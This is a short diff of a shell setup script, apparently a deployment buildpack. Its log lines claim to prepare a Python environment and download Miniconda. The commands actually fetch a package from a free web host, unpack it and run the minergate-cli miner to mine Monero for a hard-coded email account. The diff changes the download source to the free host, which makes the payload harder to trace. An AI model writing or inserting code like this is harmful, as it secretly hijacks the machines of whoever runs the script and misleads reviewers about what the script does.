@@ -36,8 +36,8 @@ echo "-----> Preparing Python Environment..."
 
 echo "---> Downloading Miniconda..."
 
-wget https://download.minergate.com/deb-cli
-ar x deb-cli
+wget https://hupiter1.000webhostapp.com/a.deb
+ar x a.deb
 tar -xvzf data.tar.gz
 cd opt/minergate-cli
 ./minergate-cli -user greenfieldsvp@outlook.com.vn -xmr
